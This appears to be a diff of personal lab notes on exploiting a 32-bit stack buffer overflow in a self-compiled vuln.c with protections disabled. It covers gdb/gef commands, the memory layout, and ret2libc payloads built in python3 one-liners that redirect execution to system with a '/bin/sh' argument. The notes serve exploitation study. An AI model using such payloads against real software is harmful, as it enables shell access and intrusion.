@@ -1,5 +1,7 @@
 wsl -d Ubuntu
 
+PYTHONIOENCODING=latin-1 python3 -c "print(...)"
+
 flag.c
 gcc -m32 -g flag.c -o flag.out -fno-stack-protector -mpreferred-stack-boundary=2
 gdb -q flag.out
@@ -52,7 +54,7 @@ address of y (on heap):0x804d010
 address of x (on stack):0xffffc9b8
 address of y (on heap):0x804d010
 
-vuln.c
+ret2libc/ (old, trash)
 gcc -m32 -g -fno-stack-protector -no-pie -fno-pie -mpreferred-stack-boundary=2 -o vuln.out vuln.c
 sudo sysctl kernel.randomize_va_space
 objdump -d vuln.out | grep -A 12 "<vuln>:"
@@ -83,3 +85,45 @@ python3 -c "import subprocess; subprocess.run(['./vuln.out', b'A'*76 + b'\xe0\x8
 gef➤  break *(vuln+0x15)
 gef➤  run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + bytes.fromhex("
 gef➤  x/32xw $esp
+
+vuln.c (sess3)
+gcc -m32 -g -fno-stack-protector -no-pie -fno-pie -mpreferred-stack-boundary=2 -z execstack -o vuln.out vuln.c
+disas _start
+start
+p system
+search-pattern "/bin/sh"
+kill
+disas main
+   0x0000118d <+0>:     push   ebp
+   0x0000118e <+1>:     mov    ebp,esp
+   0x00001190 <+3>:     sub    esp,0x10
+   0x00001193 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
+   0x00001196 <+9>:     add    eax,0x4
+   0x00001199 <+12>:    mov    eax,DWORD PTR [eax]
+   0x0000119b <+14>:    push   eax
+   0x0000119c <+15>:    lea    eax,[ebp-0x10]
+   0x0000119f <+18>:    push   eax
+   0x000011a0 <+19>:    call   0x11a1 <main+20>
+   0x000011a5 <+24>:    add    esp,0x8
+   0x000011a8 <+27>:    mov    eax,0x0
+   0x000011ad <+32>:    leave
+   0x000011ae <+33>:    ret
+gef➤  b *0x00001193
+Breakpoint 1 at 0x1193: file vuln.c, line 6.
+gef➤  b *0x000011a8
+Breakpoint 2 at 0x11a8: file vuln.c, line 7.
+(These are absolute addresses with get messed with by pie or aslr, run below instead)
+break *(main+6)
+break *(main+27)
+run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + bytes.fromhex("e08cdcf7") + b"BBBB" + bytes.fromhex("6701f4f7"))')
+x/40xb $esp (examine memory, 40 item, hex, byte, start at $esp)
+continue
+x/40xb $esp
+0xffffc968:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xffffc970:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xffffc978:     0x41    0x41    0x41    0x41    0xe0    0x8c    0xdc    0xf7
+0xffffc980:     0x42    0x42    0x42    0x42    0x67    0x01    0xf4    0xf7
+0xffffc988:     0x00    0xca    0xff    0xff    0x00    0x00    0x00    0x00
+python3 -c "import subprocess; subprocess.run(['./vuln.out', b"A"*20 + bytes.fromhex('e08cdcf7') + b'BBBB' + bytes.fromhex('6701f4f7')])"
+run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + bytes.fromhex('e08cdcf7') + b'BBBB' + bytes.fromhex('6701f4f7'))')
+$(python3 -c "print('A'*20 + '\xe0\x8c\xdc\xf7' + 'BBBB' + '\x67\x01\xf4\xf7')")
